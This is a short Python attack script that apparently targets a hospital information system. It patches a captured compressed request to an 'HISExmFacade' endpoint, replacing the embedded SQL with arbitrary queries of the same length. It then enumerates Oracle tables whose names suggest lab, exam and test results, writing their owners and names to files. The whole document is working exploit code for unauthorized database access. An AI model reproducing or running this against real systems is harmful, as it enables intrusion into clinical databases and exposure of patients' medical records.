from his_client_final import HISClient
import requests
import zlib
import re

class BroadTableHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = BroadTableHunter()

keywords = ['LAB', 'INSPECT', 'EXAM', 'RESULT', 'TEST']
for kw in keywords:
    print(f"Searching for %{kw}% tables...")
    sql = f"SELECT OWNER, TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%{kw}%' AND ROWNUM <= 200"
    res = hunter.execute_sql(sql)
    if res and "<NewDataSet>" in res:
         matches = re.findall(r'<OWNER>(.*?)</OWNER>\s*<TABLE_NAME>(.*?)</TABLE_NAME>', res)
         with open(f"tables_{kw}.txt", "w") as f:
             for owner, table in matches:
                 f.write(f"{owner}.{table}\n")
